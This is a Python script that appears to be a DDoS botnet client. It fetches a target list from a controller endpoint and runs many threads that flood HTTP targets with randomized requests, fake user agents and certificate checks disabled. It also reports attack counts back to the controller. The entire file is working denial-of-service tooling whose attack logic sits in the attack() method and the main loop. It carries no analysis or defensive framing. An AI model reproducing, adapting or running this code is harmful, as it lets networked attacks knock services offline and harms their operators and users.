#!/usr/bin/python3

import psutil
import sys
import urllib.request
import time
import json
import threading
import hashlib
import string
import random
from faker import Faker
import base64
import socket
import ssl

ALLOW_GET_ID = False
FIXED_THREAD_COUNT = None

Faker.seed()
faker = Faker()

class Random:
	def __init__(self, digit: bool, upper: bool, lower: bool, min: int, max: int):
		temp = []
		if digit:
			temp.append(string.digits)
		if upper:
			temp.append(string.ascii_uppercase)
		if lower:
			temp.append(string.ascii_lowercase)
		if len(temp) == 0:
			temp.append(string.digits)
			temp.append(string.ascii_uppercase)
			temp.append(string.ascii_lowercase)
		self._chars = "".join(temp)

		self._min = min
		self._max = max

	def get(self) -> str:
		temp = []
		for _ in range(random.randint(self._min, self._max)):
			temp.append(random.choice(self._chars))
		return "".join(temp)

class TargetResult:
	def __init__(self):
		self.total = 0
		self.success = 0

class Target:
	def __init__(self, id: str, randoms):
		self.id = id
		self._randoms = randoms

class HttpTarget(Target):
	def __init__(self, id: str, randoms, method: str, host: str, address: str, port: int, use_ssl: bool, path: str, use_random_user_agent: bool, timeout: int, response: bool, headers, body):
		super().__init__(id, randoms)

		self._method = method
		
		if host is None:
			if address is None:
				raise Exception()
			else:
				self._host = address
		else:
			self._host = host

		self._address = address
		self._port = port
		self._use_ssl = use_ssl
		self._path = string.Template(path)
		self._use_random_user_agent = use_random_user_agent
		self._timeout = timeout
		self._response = response

		self._headers = []
		if headers is not None:
			for header in headers:
				self._headers.append((string.Template(header[0]), string.Template(header[1])))

		if body is None:
			self._body = None
		elif isinstance(body, str):
			self._body = string.Template(body)
		else:
			self._body = body

	def attack(self) -> bool:
		try:
			address = self._address if self._address is not None else socket.gethostbyname(self._host)

			with socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP) as s:
				s.settimeout(self._timeout)
				s.connect((address, self._port))
				s.settimeout(None)

				s.setblocking(self._response)
				request = self._get_request()

				response = None
				if not self._use_ssl:
					s.send(request)

					if self._response:
						s.settimeout(self._timeout)
						response = s.recv(32768)
				else:
					context = ssl.create_default_context()
					context.check_hostname = False
					context.verify_mode = ssl.CERT_NONE

					with context.wrap_socket(s, server_hostname=self._host) as ws:
						ws.send(request)
						
						if self._response:
							ws.settimeout(self._timeout)
							response = ws.recv(32768)

				if self._response:
					if response is not None and len(response) > 0:
						temp = response.decode().split(' ')
						if len(temp) >= 2 and temp[0].startswith("HTTP/"):
							return 200 <= int(temp[1]) < 400
						else:
							return False
					else:
						return False
				else:
					return True
		except Exception as e:
			return False

	def _get_request(self) -> bytes:
		randoms = {}
		for index, item in enumerate(self._randoms):
			randoms[f"_{index}"] = item.get()

		temp = []
		temp.append(f"{self._method} {self._path.safe_substitute(randoms)} HTTP/1.1")
		temp.append(f"Host: {self._host}")

		if self._body is None:
			body = None
		elif isinstance(self._body, string.Template):
			body = self._body.safe_substitute(randoms).encode()
		else:
			body = self._body

		headers = {}

		if self._use_random_user_agent:
			headers["User-Agent"] = faker.user_agent()

		if body is not None:
			headers["Content-Length"] = len(body)

		for item in self._headers:
			name = item[0].safe_substitute(randoms)
			value = item[1].safe_substitute(randoms)

			if name in headers:
				headers.pop(name)

			temp.append(f"{name}: {value}")

		for name, value in headers.items():
			temp.append(f"{name}: {value}")

		temp.append("")
		temp.append("")
		temp = "\r\n".join(temp).encode()

		if body is not None:
			temp += body

		return temp

config = None
config_lock = threading.Lock()

results = {}
results_lock = threading.Lock()

is_stopped = False

def Thread():
	while not is_stopped:
		target = None
		with config_lock:
			if config is not None:
				for _ in range(len(config[1])):
					target = config[1][config[2]]

					config[2] += 1
					if config[2] == len(config[1]):
						config[2] = 0

					break
		if target is not None:
			success = target.attack()
			with results_lock:
				temp = results.get(target.id)
				if temp is None:
					temp = TargetResult()
					results[target.id] = temp

				temp.total += 1
				if success:
					temp.success += 1
		else:
			time.sleep(1)

def Results():
	global results

	temp = {}
	with results_lock:
		if len(results) > 0:
			temp = results
			results = {}
	if len(temp) > 0:
		try:
			with urllib.request.urlopen(url_results) as response:
				pass
		except:
			with results_lock:
				if len(results) == 0:
					results = temp
				else:
					for id, temp_result in temp.items():
						result = results.get(id)
						if result is None:
							results[id] = temp_result
						else:
							result.total += temp_result.total
							result.success += temp_result.success

if __name__ == "__main__":
	if ALLOW_GET_ID:
		url_id = "http://127.0.0.1/file_server/1.id"
	url_config = "http://localhost:5001/client/get_targets"
	url_results = "http://localhost:5001/set_attack_count"
	
	cpu_count = psutil.cpu_count()
	thread_count = FIXED_THREAD_COUNT if FIXED_THREAD_COUNT is not None else cpu_count * 5
	id_path = "id"
	valid_id_len = 16

	try:
		with open(id_path, "r") as f:
			id = f.read()
		if len(id) != valid_id_len:
			print(f"invalid id file.")
			sys.exit(1)
	except Exception as e:
		if ALLOW_GET_ID and isinstance(e, FileNotFoundError):
			id = None
		else:
			print(f"could not read id file.")
			sys.exit(2)

	if ALLOW_GET_ID and id is None:
		print(f"getting id...")
		try:
			while True:
				try:
					with urllib.request.urlopen(url_id) as response:
						temp = response.read().decode()
						if len(temp) == valid_id_len:
							with open(id_path, "w") as f:
								f.write(temp)
							id = temp
							break
				except:
					pass

				time.sleep(5)

		except KeyboardInterrupt:
			sys.exit(3)

	print(f"id: {id if id else '-'}")
	print(f"logical cores: {cpu_count}")
	print(f"threads: {thread_count}")

	threads = []
	for _ in range(thread_count):
		thread = threading.Thread(target=Thread)
		thread.start()
		threads.append(thread)

	try:
		while True:
			try:
				with urllib.request.urlopen(url_config) as response:
					temp = response.read()
					md5 = hashlib.md5(temp).hexdigest()
					if config is None or config[0] != md5:
						temp =  json.loads(temp.decode())

						randoms = []
						for item in temp.get("randoms", []):
							randoms.append(Random(
								item.get("digit", False),
								item.get("upper", False),
								item.get("lower", False),
								item.get("min", 5),
								item.get("max", 10)))

						targets = []
						for id, item in temp.get("targets", {}).items():
							ratio = int(item.get("ratio", 1))
							if ratio < 1:
								ratio = 1
							
							target = None
							if item["type"] == "http":
								headers = []
								for header in item.get("headers", []):
									headers.append((header["name"], header["value"]))

								body = item.get("body")
								if body is not None:
									if body["type"] == "str":
										body = body["value"]
									elif body["type"] == "bytes":
										body = base64.b64decode(body["value"])
									else:
										body = None

								target = HttpTarget(
									id,
									randoms,
									item["method"],
									item.get("host"),
									item.get("address"),
									item["port"],
									item["use_ssl"],
									item["path"],
									item["use_random_user_agent"],
									item["timeout"],
									item["response"],
									headers,
									body)

							if target is not None:
								for _ in range(ratio):
									targets.append(target)

						with config_lock:
							config = [md5, targets, 0]

				Results()

			except KeyboardInterrupt:
				raise

			except:
				pass

			time.sleep(60)

	except KeyboardInterrupt:
		pass

	is_stopped = True

	for thread in threads:
		thread.join()

	Results()
	sys.exit(0)
